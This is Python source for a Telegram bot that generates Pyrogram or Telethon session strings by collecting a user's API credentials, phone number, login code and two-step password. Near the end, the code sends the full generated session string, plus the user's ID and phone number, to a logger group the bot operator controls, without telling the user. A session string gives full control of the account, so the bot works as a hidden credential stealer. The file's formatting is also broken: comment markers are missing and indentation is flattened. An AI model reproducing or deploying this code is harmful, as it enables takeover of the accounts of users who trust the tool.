import asyncio
import env
from pyrogram import Client
from pyrogram.errors import (
SessionPasswordNeeded,
PasswordHashInvalid,
FloodWait,
ApiIdInvalid
)
from telethon import TelegramClient
from telethon.sessions import StringSession

================= LOG FUNCTION =================

async def send_log(bot, text):
if not env.LOGGER_GROUP:
return

try:  
    await bot.send_message(  
        chat_id=int(env.LOGGER_GROUP),  
        text=text  
    )  
except Exception as e:  
    print(f"Logger Error: {e}")

================= SESSION GENERATOR =================

async def generate_session(bot, msg, telethon=False):

user_id = msg.chat.id  

await msg.reply("🚀 Session generation started...")  

# ================= API_ID =================  
while True:  
    api_id_msg = await bot.ask(user_id, "Send API_ID")  

    if api_id_msg.text.isdigit():  
        api_id = int(api_id_msg.text)  
        break  

    await msg.reply("❌ Invalid API_ID. Please send numbers only.")  

# ================= API_HASH =================  
while True:  
    api_hash_msg = await bot.ask(user_id, "Send API_HASH")  

    api_hash = api_hash_msg.text.strip()  

    if len(api_hash) > 10:  
        break  

    await msg.reply("❌ Invalid API_HASH. Please send correct value.")  

# ================= PHONE (RETRY) =================  
while True:  
    phone = (await bot.ask(user_id, "📱 Send Phone Number (+91...)")).text.strip()  

    if phone.startswith("+") and len(phone) >= 10:  
        break  

    await msg.reply("❌ Invalid phone number. Try again.")  

await msg.reply("📨 Sending OTP...")  

# ================= CLIENT INIT =================  
try:  
    if telethon:  
        client = TelegramClient(StringSession(), api_id, api_hash)  
    else:  
        client = Client(  
            name="session_gen",  
            api_id=api_id,  
            api_hash=api_hash,  
            in_memory=True  
        )  

    await client.connect()  

except ApiIdInvalid:  
    await msg.reply("❌ API_ID / API_HASH invalid hai.")  
    return  

# ================= SEND CODE =================  
try:  
    if telethon:  
        code = await client.send_code_request(phone)  
    else:  
        code = await client.send_code(phone)  

except ApiIdInvalid:  
    await msg.reply("❌ API credentials invalid.")  
    await client.disconnect()  
    return  

except FloodWait as e:  
    await msg.reply(f"⛔ FloodWait: {e.value} seconds")  
    await client.disconnect()  
    return  

# ================= OTP (RETRY) =================  
while True:  
    otp_msg = await bot.ask(user_id, "🔐 Send OTP (numbers only)")  
    otp = otp_msg.text.replace(" ", "")  

    if otp.isdigit():  
        break  

    await msg.reply("❌ Invalid OTP. Try again.")  

# ================= LOGIN =================  
password = None  

try:  
    if telethon:  
        await client.sign_in(phone, otp)  
    else:  
        await client.sign_in(phone, code.phone_code_hash, otp)  

except SessionPasswordNeeded:  

    # ================= PASSWORD (RETRY) =================  
    while True:  
        password_msg = await bot.ask(  
            user_id,  
            "🔐 2-Step Password (or /skip)"  
        )  

        text = password_msg.text  

        if text.lower() == "/skip":  
            password = None  
            break  

        if len(text) >= 3:  
            password = text  
            break  

        await msg.reply("❌ Invalid password. Try again.")  

    try:  
        if password:  
            if telethon:  
                await client.sign_in(password=password)  
            else:  
                await client.check_password(password=password)  

    except PasswordHashInvalid:  
        await msg.reply("❌ Wrong password")  
        await client.disconnect()  
        return  

except Exception as e:  
    await msg.reply(f"❌ LOGIN ERROR: {str(e)}")  
    await client.disconnect()  
    return  

# ================= SESSION GENERATE =================  
if telethon:  
    session = client.session.save()  
else:  
    session = await client.export_session_string()  

await client.disconnect()  

# ================= OUTPUT =================  
await msg.reply(f"✅ SESSION GENERATED:\n\n`{session}`")  

# ================= LOG GROUP =================  
try:
await bot.send_message(
int(env.LOGGER_GROUP),
f"🔥 NEW SESSION GENERATED:\n\n{session}"
)
except Exception as e:
print("Log error:", e)

================= SAFE LOG =================

await send_log(
bot,
f"✅ Session Generated\nUser ID: {user_id}\nPhone: {phone}"
)

